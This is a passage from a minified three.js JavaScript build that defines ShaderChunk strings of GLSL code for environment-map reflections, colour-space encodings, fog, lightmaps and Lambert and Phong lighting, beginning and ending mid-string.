pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\\n}\\n\";\nTHREE.ShaderChunk.cube_uv_reflection_fragment=\"#ifdef ENVMAP_TYPE_CUBE_UV\\n#define cubeUV_textureSize (1024.0)\\nint getFaceFromDirection(vec3 direction) {\\n\\tvec3 absDirection = abs(direction);\\n\\tint face = -1;\\n\\tif( absDirection.x > absDirection.z ) {\\n\\t\\tif(absDirection.x > absDirection.y )\\n\\t\\t\\tface = direction.x > 0.0 ? 0 : 3;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\telse {\\n\\t\\tif(absDirection.z > absDirection.y )\\n\\t\\t\\tface = direction.z > 0.0 ? 2 : 5;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\treturn face;\\n}\\n#define cubeUV_maxLods1  (log2(cubeUV_textureSize*0.25) - 1.0)\\n#define cubeUV_rangeClamp (exp2((6.0 - 1.0) * 2.0))\\nvec2 MipLevelInfo( vec3 vec, float roughnessLevel, float roughness ) {\\n\\tfloat scale = exp2(cubeUV_maxLods1 - roughnessLevel);\\n\\tfloat dxRoughness = dFdx(roughness);\\n\\tfloat dyRoughness = dFdy(roughness);\\n\\tvec3 dx = dFdx( vec * scale * dxRoughness );\\n\\tvec3 dy = dFdy( vec * scale * dyRoughness );\\n\\tfloat d = max( dot( dx, dx ), dot( dy, dy ) );\\n\\td = clamp(d, 1.0, cubeUV_rangeClamp);\\n\\tfloat mipLevel = 0.5 * log2(d);\\n\\treturn vec2(floor(mipLevel), fract(mipLevel));\\n}\\n#define cubeUV_maxLods2 (log2(cubeUV_textureSize*0.25) - 2.0)\\n#define cubeUV_rcpTextureSize (1.0 / cubeUV_textureSize)\\nvec2 getCubeUV(vec3 direction, float roughnessLevel, float mipLevel) {\\n\\tmipLevel = roughnessLevel > cubeUV_maxLods2 - 3.0 ? 0.0 : mipLevel;\\n\\tfloat a = 16.0 * cubeUV_rcpTextureSize;\\n\\tvec2 exp2_packed = exp2( vec2( roughnessLevel, mipLevel ) );\\n\\tvec2 rcp_exp2_packed = vec2( 1.0 ) / exp2_packed;\\n\\tfloat powScale = exp2_packed.x * exp2_packed.y;\\n\\tfloat scale = rcp_exp2_packed.x * rcp_exp2_packed.y * 0.25;\\n\\tfloat mipOffset = 0.75*(1.0 - rcp_exp2_packed.y) * rcp_exp2_packed.x;\\n\\tbool bRes = mipLevel == 0.0;\\n\\tscale =  bRes && (scale < a) ? a : scale;\\n\\tvec3 r;\\n\\tvec2 offset;\\n\\tint face = getFaceFromDirection(direction);\\n\\tfloat rcpPowScale = 1.0 / powScale;\\n\\tif( face == 0) {\\n\\t\\tr = vec3(direction.x, -direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 1) {\\n\\t\\tr = vec3(direction.y, direction.x, direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 2) {\\n\\t\\tr = vec3(direction.z, direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 3) {\\n\\t\\tr = vec3(direction.x, direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\telse if( face == 4) {\\n\\t\\tr = vec3(direction.y, direction.x, -direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\telse {\\n\\t\\tr = vec3(direction.z, -direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\tr = normalize(r);\\n\\tfloat texelOffset = 0.5 * cubeUV_rcpTextureSize;\\n\\tvec2 s = ( r.yz / abs( r.x ) + vec2( 1.0 ) ) * 0.5;\\n\\tvec2 base = offset + vec2( texelOffset );\\n\\treturn base + s * ( scale - 2.0 * texelOffset );\\n}\\n#define cubeUV_maxLods3 (log2(cubeUV_textureSize*0.25) - 3.0)\\nvec4 textureCubeUV(vec3 reflectedDirection, float roughness ) {\\n\\tfloat roughnessVal = roughness* cubeUV_maxLods3;\\n\\tfloat r1 = floor(roughnessVal);\\n\\tfloat r2 = r1 + 1.0;\\n\\tfloat t = fract(roughnessVal);\\n\\tvec2 mipInfo = MipLevelInfo(reflectedDirection, r1, roughness);\\n\\tfloat s = mipInfo.y;\\n\\tfloat level0 = mipInfo.x;\\n\\tfloat level1 = level0 + 1.0;\\n\\tlevel1 = level1 > 5.0 ? 5.0 : level1;\\n\\tlevel0 += min( floor( s + 0.5 ), 5.0 );\\n\\tvec2 uv_10 = getCubeUV(reflectedDirection, r1, level0);\\n\\tvec4 color10 = envMapTexelToLinear(texture2D(envMap, uv_10));\\n\\tvec2 uv_20 = getCubeUV(reflectedDirection, r2, level0);\\n\\tvec4 color20 = envMapTexelToLinear(texture2D(envMap, uv_20));\\n\\tvec4 result = mix(color10, color20, t);\\n\\treturn vec4(result.rgb, 1.0);\\n}\\n#endif\\n\";\nTHREE.ShaderChunk.defaultnormal_vertex=\"#ifdef FLIP_SIDED\\n\\tobjectNormal = -objectNormal;\\n#endif\\nvec3 transformedNormal = normalMatrix * objectNormal;\\n\";THREE.ShaderChunk.displacementmap_vertex=\"#ifdef USE_DISPLACEMENTMAP\\n\\ttransformed += normal * ( texture2D( displacementMap, uv ).x * displacementScale + displacementBias );\\n#endif\\n\";THREE.ShaderChunk.displacementmap_pars_vertex=\"#ifdef USE_DISPLACEMENTMAP\\n\\tuniform sampler2D displacementMap;\\n\\tuniform float displacementScale;\\n\\tuniform float displacementBias;\\n#endif\\n\";\nTHREE.ShaderChunk.emissivemap_fragment=\"#ifdef USE_EMISSIVEMAP\\n\\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\\n\\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\\n\\ttotalEmissiveRadiance *= emissiveColor.rgb;\\n#endif\\n\";THREE.ShaderChunk.emissivemap_pars_fragment=\"#ifdef USE_EMISSIVEMAP\\n\\tuniform sampler2D emissiveMap;\\n#endif\\n\";THREE.ShaderChunk.encodings_pars_fragment=\"\\nvec4 LinearToLinear( in vec4 value ) {\\n  return value;\\n}\\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\\n  return vec4( pow( value.xyz, vec3( gammaFactor ) ), value.w );\\n}\\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\\n  return vec4( pow( value.xyz, vec3( 1.0 / gammaFactor ) ), value.w );\\n}\\nvec4 sRGBToLinear( in vec4 value ) {\\n  return vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.w );\\n}\\nvec4 LinearTosRGB( in vec4 value ) {\\n  return vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.w );\\n}\\nvec4 RGBEToLinear( in vec4 value ) {\\n  return vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\\n}\\nvec4 LinearToRGBE( in vec4 value ) {\\n  float maxComponent = max( max( value.r, value.g ), value.b );\\n  float fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\\n  return vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\\n}\\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\\n  return vec4( value.xyz * value.w * maxRange, 1.0 );\\n}\\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\\n  float maxRGB = max( value.x, max( value.g, value.b ) );\\n  float M      = clamp( maxRGB / maxRange, 0.0, 1.0 );\\n  M            = ceil( M * 255.0 ) / 255.0;\\n  return vec4( value.rgb / ( M * maxRange ), M );\\n}\\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\\n    return vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\\n}\\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\\n    float maxRGB = max( value.x, max( value.g, value.b ) );\\n    float D      = max( maxRange / maxRGB, 1.0 );\\n    D            = min( floor( D ) / 255.0, 1.0 );\\n    return vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\\n}\\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\\nvec4 LinearToLogLuv( in vec4 value )  {\\n  vec3 Xp_Y_XYZp = value.rgb * cLogLuvM;\\n  Xp_Y_XYZp = max(Xp_Y_XYZp, vec3(1e-6, 1e-6, 1e-6));\\n  vec4 vResult;\\n  vResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\\n  float Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\\n  vResult.w = fract(Le);\\n  vResult.z = (Le - (floor(vResult.w*255.0))/255.0)/255.0;\\n  return vResult;\\n}\\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\\nvec4 LogLuvToLinear( in vec4 value ) {\\n  float Le = value.z * 255.0 + value.w;\\n  vec3 Xp_Y_XYZp;\\n  Xp_Y_XYZp.y = exp2((Le - 127.0) / 2.0);\\n  Xp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\\n  Xp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\\n  vec3 vRGB = Xp_Y_XYZp.rgb * cLogLuvInverseM;\\n  return vec4( max(vRGB, 0.0), 1.0 );\\n}\\n\";\nTHREE.ShaderChunk.encodings_fragment=\"  gl_FragColor = linearToOutputTexel( gl_FragColor );\\n\";THREE.ShaderChunk.envmap_fragment=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#else\\n\\t\\tvec3 reflectVec = vReflect;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tvec4 envColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\\n\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\tvec2 sampleUV;\\n\\t\\tsampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\\n\\t\\tsampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\tvec4 envColor = texture2D( envMap, sampleUV );\\n\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\tvec3 reflectView = flipNormal * normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0, 0.0, 1.0 ) );\\n\\t\\tvec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\\n\\t#endif\\n\\tenvColor = envMapTexelToLinear( envColor );\\n\\t#ifdef ENVMAP_BLENDING_MULTIPLY\\n\\t\\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_MIX )\\n\\t\\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_ADD )\\n\\t\\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.envmap_pars_fragment=\"#if defined( USE_ENVMAP ) || defined( PHYSICAL )\\n\\tuniform float reflectivity;\\n\\tuniform float envMapIntenstiy;\\n#endif\\n#ifdef USE_ENVMAP\\n\\t#if ! defined( PHYSICAL ) && ( defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tuniform samplerCube envMap;\\n\\t#else\\n\\t\\tuniform sampler2D envMap;\\n\\t#endif\\n\\tuniform float flipEnvMap;\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( PHYSICAL )\\n\\t\\tuniform float refractionRatio;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.envmap_pars_vertex=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t\\tuniform float refractionRatio;\\n\\t#endif\\n#endif\\n\";THREE.ShaderChunk.envmap_vertex=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvWorldPosition = worldPosition.xyz;\\n\\t#else\\n\\t\\tvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvReflect = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.fog_fragment=\"#ifdef USE_FOG\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tfloat depth = gl_FragDepthEXT / gl_FragCoord.w;\\n\\t#else\\n\\t\\tfloat depth = gl_FragCoord.z / gl_FragCoord.w;\\n\\t#endif\\n\\t#ifdef FOG_EXP2\\n\\t\\tfloat fogFactor = whiteCompliment( exp2( - fogDensity * fogDensity * depth * depth * LOG2 ) );\\n\\t#else\\n\\t\\tfloat fogFactor = smoothstep( fogNear, fogFar, depth );\\n\\t#endif\\n\\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\\n#endif\\n\";\nTHREE.ShaderChunk.fog_pars_fragment=\"#ifdef USE_FOG\\n\\tuniform vec3 fogColor;\\n\\t#ifdef FOG_EXP2\\n\\t\\tuniform float fogDensity;\\n\\t#else\\n\\t\\tuniform float fogNear;\\n\\t\\tuniform float fogFar;\\n\\t#endif\\n#endif\";THREE.ShaderChunk.lightmap_fragment=\"#ifdef USE_LIGHTMAP\\n\\treflectedLight.indirectDiffuse += PI * texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n#endif\\n\";THREE.ShaderChunk.lightmap_pars_fragment=\"#ifdef USE_LIGHTMAP\\n\\tuniform sampler2D lightMap;\\n\\tuniform float lightMapIntensity;\\n#endif\";\nTHREE.ShaderChunk.lights_lambert_vertex=\"vec3 diffuse = vec3( 1.0 );\\nGeometricContext geometry;\\ngeometry.position = mvPosition.xyz;\\ngeometry.normal = normalize( transformedNormal );\\ngeometry.viewDir = normalize( -mvPosition.xyz );\\nGeometricContext backGeometry;\\nbackGeometry.position = geometry.position;\\nbackGeometry.normal = -geometry.normal;\\nbackGeometry.viewDir = geometry.viewDir;\\nvLightFront = vec3( 0.0 );\\n#ifdef DOUBLE_SIDED\\n\\tvLightBack = vec3( 0.0 );\\n#endif\\nIncidentLight directLight;\\nfloat dotNL;\\nvec3 directLightColor_Diffuse;\\n#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\tvLightFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\";\nTHREE.ShaderChunk.lights_pars=\"uniform vec3 ambientLightColor;\\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\\n\\tvec3 irradiance = ambientLightColor;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treturn irradiance;\\n}\\n#if NUM_DIR_LIGHTS > 0\\n\\tstruct DirectionalLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\\n\\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tdirectLight.color = directionalLight.color;\\n\\t\\tdirectLight.direction = directionalLight.direction;\\n\\t\\tdirectLight.visible = true;\\n\\t}\\n#endif\\n#if NUM_POINT_LIGHTS > 0\\n\\tstruct PointLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\\n\\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tvec3 lVector = pointLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tif ( testLightInRange( lightDistance, pointLight.distance ) ) {\\n\\t\\t\\tdirectLight.color = pointLight.color;\\n\\t\\t\\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tstruct SpotLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tfloat coneCos;\\n\\t\\tfloat penumbraCos;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\\n\\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight  ) {\\n\\t\\tvec3 lVector = spotLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tfloat angleCos = dot( directLight.direction, spotLight.direction );\\n\\t\\tif ( all( bvec2( angleCos > spotLight.coneCos, testLightInRange( lightDistance, spotLight.distance ) ) ) ) {\\n\\t\\t\\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\\n\\t\\t\\tdirectLight.color = spotLight.color;\\n\\t\\t\\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tstruct HemisphereLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 skyColor;\\n\\t\\tvec3 groundColor;\\n\\t};\\n\\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\\n\\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\\n\\t\\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\\n\\t\\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\\n\\t\\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tirradiance *= PI;\\n\\t\\t#endif\\n\\t\\treturn irradiance;\\n\\t}\\n#endif\\n#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\\n\\t\\t#include <normal_flip>\\n\\t\\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryVec = flipNormal * vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryVec = flipNormal * vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV( queryVec, 1.0 );\\n\\t\\t#else\\n\\t\\t\\tvec4 envMapColor = vec4( 0.0 );\\n\\t\\t#endif\\n\\t\\treturn PI * envMapColor.rgb * envMapIntensity;\\n\\t}\\n\\tfloat getSpecularMIPLevel( const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\tfloat maxMIPLevelScalar = float( maxMIPLevel );\\n\\t\\tfloat desiredMIPLevel = maxMIPLevelScalar - 0.79248 - 0.5 * log2( pow2( blinnShininessExponent ) + 1.0 );\\n\\t\\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\\n\\t}\\n\\tvec3 getLightProbeIndirectRadiance( const in GeometricContext geometry, const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( -geometry.viewDir, geometry.normal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( -geometry.viewDir, geometry.normal, refractionRatio );\\n\\t\\t#endif\\n\\t\\t#include <normal_flip>\\n\\t\\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\\n\\t\\tfloat specularMIPLevel = getSpecularMIPLevel( blinnShininessExponent, maxMIPLevel );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryReflectVec = flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryReflectVec = flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV(queryReflectVec, BlinnExponentToGGXRoughness(blinnShininessExponent));\\n\\t\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\t\\tvec2 sampleUV;\\n\\t\\t\\tsampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\\n\\t\\t\\tsampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\t\\tvec3 reflectView = flipNormal * normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0,0.0,1.0 ) );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#endif\\n\\t\\treturn envMapColor.rgb * envMapIntensity;\\n\\t}\\n#endif\\n\";\nTHREE.ShaderChunk.lights_phong_fragment=\"BlinnPhongMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb;\\nmaterial.specularColor = specular;\\nmaterial.specularShininess = shininess;\\nmaterial.specularStrength = specularStrength;\\n\";THREE.ShaderChunk.lights_phong_pars_fragment=\"varying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\nstruct BlinnPhongMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tvec3\\tspecularColor;\\n\\tfloat\\tspecularShininess;\\n\\tfloat\\tspecularStrength;\\n};\\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\\n}\\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\n#define 